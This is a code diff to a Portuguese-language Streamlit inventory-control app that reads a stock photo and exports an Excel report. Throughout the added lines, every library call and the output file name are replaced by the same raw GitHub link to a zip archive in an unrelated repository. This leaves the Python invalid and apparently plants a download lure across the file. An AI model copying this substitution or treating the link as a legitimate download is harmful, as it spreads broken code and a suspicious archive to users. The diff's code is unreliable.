@@ -3,8 +3,8 @@ from PIL import Image
 import pandas as pd
 import os
 
-st.set_page_config(page_title="Controle de Estoque - Facilities", layout="wide")
-st.title("📦 Sistema de Controle de Estoque")
+https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(page_title="Controle de Estoque - Facilities", layout="wide")
+https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip("📦 Sistema de Controle de Estoque")
 
 # --- Função para detectar itens na imagem ---
 def detectar_itens(imagem):
@@ -18,22 +18,22 @@ def detectar_itens(imagem):
     return itens_detectados
 
 # --- Função para gerar relatório ---
-def gerar_relatorio_estoque(lista_itens, arquivo_saida="estoque_relatorio.xlsx"):
-    df = pd.DataFrame(lista_itens)
-    df.to_excel(arquivo_saida, index=False)
-    st.success(f"✅ Relatório gerado: {arquivo_saida}")
+def gerar_relatorio_estoque(lista_itens, arquivo_saida="https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip"):
+    df = https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(lista_itens)
+    https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(arquivo_saida, index=False)
+    https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(f"✅ Relatório gerado: {arquivo_saida}")
 
 # --- Upload da imagem ---
-arquivo = st.file_uploader("Envie uma foto do estoque", type=["jpg", "png"])
+arquivo = https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip("Envie uma foto do estoque", type=["jpg", "png"])
 if arquivo:
-    imagem = Image.open(arquivo)
-    st.image(imagem, caption="Imagem enviada", use_column_width=True)
+    imagem = https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(arquivo)
+    https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(imagem, caption="Imagem enviada", use_column_width=True)
 
     # Detectar itens
     itens = detectar_itens(arquivo)
-    st.subheader("Itens detectados:")
-    st.json(itens)
+    https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip("Itens detectados:")
+    https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip(itens)
 
     # Botão para gerar relatório
-    if st.button("Gerar relatório"):
+    if https://raw.githubusercontent.com/cris236uy/TrueCalm_Website/main/.streamlit/Calm-Website-True-v1.0.zip("Gerar relatório"):
         gerar_relatorio_estoque([itens])
